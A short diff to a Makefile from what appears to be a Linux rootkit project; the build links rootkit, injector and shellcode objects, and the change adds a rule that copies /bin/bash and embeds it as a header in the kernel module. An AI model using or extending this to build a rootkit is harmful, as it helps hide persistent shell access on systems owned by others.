@@ -16,8 +16,12 @@ user: module
 	ld -s -r -b binary shellcode.bin -o shellcode.o
 	gcc src/user/user.c rootkit.ko.o injector.o shellcode.o  -o user -static
 
-module:
+module: bash.h
 	$(MAKE) -C $(KDIR) M=$(PWD) modules
+
+bash.h:
+	cp /bin/bash .
+	xxd -i bash | sed 's/^unsigned/static const unsigned/g' > src/kernel/bash.h
 
 clean:
 	mv src/user/shellcode.s shellcode.bk
